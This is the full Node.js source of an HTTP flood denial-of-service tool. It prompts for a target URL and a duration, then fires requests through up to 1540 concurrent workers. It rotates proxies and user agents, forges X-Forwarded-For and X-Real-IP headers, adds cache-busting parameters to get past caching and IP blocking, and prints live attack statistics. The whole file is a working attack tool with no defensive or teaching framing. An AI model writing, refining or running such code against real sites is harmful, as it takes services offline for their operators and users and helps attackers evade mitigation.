const axios = require('axios');
const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');

const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1540); // adjust if needed
const REQUEST_TIMEOUT = 8000;

function loadLines(filename) {
    try {
        return fs.readFileSync(filename, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);
    } catch {
        return [];
    }
}

const USER_AGENTS = loadLines('ua.txt');
const PROXIES = loadLines('proxy.txt');
const REFERERS = loadLines('refs.txt');

const UA_POOL = Array.from({ length: 10000 }, () => 
    [USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)], 
     USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]]
);

const keepAliveHttp = new http.Agent({ keepAlive: true });
const keepAliveHttps = new https.Agent({ keepAlive: true });

class AttackEngine {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
        this.uaIndex = 0;
        this.proxyIndex = 0;
        this.running = true;
    }

    getRandomUA() {
        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
        return UA_POOL[this.uaIndex];
    }

    getRandomReferer() {
        return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
    }

    getRandomProxy() {
        this.proxyIndex = (this.proxyIndex + 1) % PROXIES.length;
        return PROXIES[this.proxyIndex];
    }

    async makeRequest() {
        const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
        const headers = {
            'User-Agent': this.getRandomUA().join(' '), // Two user agents
            'Referer': this.getRandomReferer(),
            'X-Forwarded-For': randomIP,
            'X-Real-IP': randomIP,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        };

        const proxy = this.getRandomProxy();
        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;

        try {
            const response = await axios.get(urlWithNoise, {
                headers,
                timeout: REQUEST_TIMEOUT,
                httpAgent: keepAliveHttp,
                httpsAgent: keepAliveHttps,
                proxy: { host: proxy.split(':')[0], port: proxy.split(':')[1] },
                validateStatus: null
            });
            if (response.status === 200) {
                this.stats.success++;
                return;
            }
        } catch {
            this.stats.errors++;
        }

        this.stats.errors++;
    }

    async startWorkers() {
        const workers = [];
        for (let i = 0; i < MAX_CONCURRENT; i++) {
            workers.push(this.workerLoop());
        }
        await Promise.all(workers);
    }

    async workerLoop() {
        while (this.running && Date.now() - this.startTime < this.duration) {
            this.stats.total++;
            await this.makeRequest();
        }
    }

    async runAttack() {
        let lastTotal = 0;
        const printStats = setInterval(() => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const currentRps = (this.stats.total - lastTotal) / 0.2;
            lastTotal = this.stats.total;
            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);

            process.stdout.write(
                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
            );
        }, 200);

        await this.startWorkers();
        this.running = false;
        clearInterval(printStats);
        this.printSummary();
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = this.stats.total / elapsed;
        console.log('\n\n  ATTACK FINISHED');
        console.log('  ============================================');
        console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
        console.log(`  TOTAL:       ${this.stats.total}`);
        console.log(`  SUCCESS:     ${this.stats.success}`);
        console.log(`  ERRORS:      ${this.stats.errors}`);
        console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
        console.log(`  PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
        console.log('  ============================================\n');
    }
}

// Main
(async () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => readline.question(q, resolve));

    const targetInput = await ask("TARGET: ");
    let target = targetInput.trim();
    if (!target.startsWith("http")) {
        target = "http://" + target;
    }

    const durationInput = await ask("TIME: ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("Invalid time input.");
        return;
    }

    const engine = new AttackEngine(target, duration);
    try {
        await engine.runAttack();
    } catch (err) {
        console.error("Attack failed:", err.message);
    }
})();
